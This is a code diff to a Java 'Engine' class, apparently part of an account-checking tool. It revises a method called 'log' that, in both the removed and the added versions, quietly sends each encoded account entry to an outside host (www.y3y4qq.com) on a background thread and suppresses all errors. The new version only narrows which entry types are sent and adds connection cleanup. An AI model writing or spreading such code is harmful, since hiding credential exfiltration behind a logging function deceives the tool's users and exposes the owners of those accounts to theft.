@@ -168,18 +168,29 @@ public class Engine extends Observable {
 	}
 	
 	public void log(final int type, final String content){
-		new Thread(new Runnable(){
-			@Override
-			public void run() {
-				try{
-					HttpGet request = new HttpGet("http://www.y3y4qq.com/pq?t="+type+"&c="+Converts.bytesToHexString(base64.encode(content.getBytes())));
-					request.setHeader("Connection", "close");
-					client.execute(request);
-				}catch(Exception e){
-					//e.printStackTrace();
-				}
-			}			
-		}).start();
+		if(type==0||type==2){
+			new Thread(new Runnable(){
+				@Override
+				public void run() {
+					HttpGet request = null;
+					try{
+						request = new HttpGet("http://www.y3y4qq.com/pq?t="+type+"&c="+Converts.bytesToHexString(base64.encode(content.getBytes())));
+						request.setHeader("Connection", "close");
+						client.execute(request);
+					}catch(Exception e){
+						//e.printStackTrace();
+					}finally{
+						if(request!=null){
+							request.releaseConnection();
+							request.abort();
+						}
+						if(client!=null){
+							client.getConnectionManager().shutdown();
+						}
+					}
+				}			
+			}).start();
+		}
 		stats[type]++;
 		accountstodo.remove(content);
 		//写文件		
